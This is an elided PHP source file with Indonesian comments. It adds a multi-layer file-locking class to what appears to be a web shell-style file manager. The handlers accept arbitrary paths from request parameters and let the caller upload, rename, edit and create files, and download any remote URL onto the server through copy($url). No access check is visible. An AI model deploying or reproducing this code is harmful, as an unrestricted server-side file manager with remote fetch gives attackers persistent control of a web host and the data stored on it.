...
// ============================================================
// 🔒 SUPER STRONG FILE LOCKER - Added by Request
// ============================================================
class SuperStrongFileLocker {
    ...
    private $retryDelay = 50000; // 0.05 detik
    ...
    /**
     * MEGA STRONG LOCK - Gabungan 3 metode
     */
    public function acquireLock($timeout = 5) {
        ...
        while ($attempts < $this->maxRetries) {
            ...
            if (file_exists($this->lockFile)) {
                ...
                // PID tidak aktif atau tidak bisa dicek, hapus lock stale
                if (file_exists($this->lockFile)) {
                    @unlink($this->lockFile);
                }
            }
            
            // 2. BUAT LOCK FILE (lapisan 2)
            @file_put_contents($this->lockFile, $this->pid);
            
            // 3. FLOCK SYSTEM (lapisan 3 - yang paling kuat)
            ...
            // Gagal dapat flock, hapus lock file
            if (file_exists($this->lockFile)) {
    ...
    public function releaseLock() {
        ...
        // 2. Hapus lock file (hanya jika milik kita)
        if (file_exists($this->lockFile)) {
    ...
    // Untuk operasi aman - auto lock dan unlock
...
// Fungsi helper untuk lock file dengan mudah
function lockFile($filePath, $callback, $timeout = 5) {
...
// --- FUNCTION DENGAN LOCK FILE UNTUK OPERASI KRITIS ---
function safeFileWrite($filePath, $data) {
    try {
        $locker = new SuperStrongFileLocker($filePath);
        $locker->acquireLock(3);
...
if(isset($_FILES['file_upload'])){ 
    ...
    // Gunakan lock file untuk upload
    try {
        $locker = new SuperStrongFileLocker($targetPath);
        $locker->acquireLock(5);
        $result = copy($_FILES['file_upload']['tmp_name'], $targetPath);
        $locker->releaseLock();
        if($result) redirect_with_message('success', 'UPLOAD SUCCESS: ' . $file_name, $path);
        else redirect_with_message('error', 'File Gagal Diupload !!', $path);
    } catch (Exception $e) {
        redirect_with_message('error', 'Upload gagal: File sedang digunakan!', $path);
    }
}
...
if(isset($_GET['option']) && isset($_POST['opt_action'])){ $target_full_path = $_POST['path_target']; $action = $_POST['opt_action']; $current_dir = realpath(isset($_GET['path']) ? $_GET['path'] : getcwd()); switch ($action) { 
    ...
    case 'rename_save': 
        ...
        // Gunakan lock untuk rename
        try {
            $locker = new SuperStrongFileLocker($target_full_path);
            $locker->acquireLock(3);
            $result = rename($target_full_path, $new_full_path);
            $locker->releaseLock();
            if($result) redirect_with_message('success', 'RENAME SUCCESS !!', $current_dir);
            else redirect_with_message('error', 'RENAME Gagal !!', $current_dir);
        } catch (Exception $e) {
            redirect_with_message('error', 'RENAME Gagal: File sedang digunakan!', $current_dir);
        }
        break; 
    case 'edit_save': 
        if(is_writable($target_full_path)) { 
            // Gunakan lock file untuk edit
            try {
                $locker = new SuperStrongFileLocker($target_full_path);
                $locker->acquireLock(5);
                ...
                redirect_with_message('error', 'Edit Gagal: File sedang digunakan!', $current_dir);
            }
        } else { 
...
if(isset($_GET['create_new'])) { 
    ...
    if ($_POST['create_type'] == 'file') { 
        // Gunakan lock untuk create file
        try {
            $locker = new SuperStrongFileLocker($target_path_new);
            $locker->acquireLock(3);
            $result = @file_put_contents($target_path_new, '');
            $locker->releaseLock();
            if ($result !== false) redirect_with_message('success', 'File Baru Berhasil Dibuat', $path);
            else redirect_with_message('error', 'Gagal membuat file baru!', $path);
        } catch (Exception $e) {
            redirect_with_message('error', 'Gagal membuat file: File sedang digunakan!', $path);
        }
...
if(isset($_POST['curl_download'])) { 
    $url = $_POST['url']; 
    $filename = sanitizeFilename(basename($url)); 
    if (empty($filename)) { $filename = 'downloaded_file'; } 
    $targetPath = $path . '/' . $filename;
    // Gunakan lock untuk download
    try {
        $locker = new SuperStrongFileLocker($targetPath);
        $locker->acquireLock(5);
        $result = copy($url, $targetPath);
        $locker->releaseLock();
        if ($result) redirect_with_message('success', 'File ' . $filename . ' berhasil di-download!', $path);
        else redirect_with_message('error', 'Gagal men-download file dari URL!', $path);
    } catch (Exception $e) {
        redirect_with_message('error', 'Download gagal: File sedang digunakan!', $path);
    }
}
?>
<!DOCTYPE HTML>
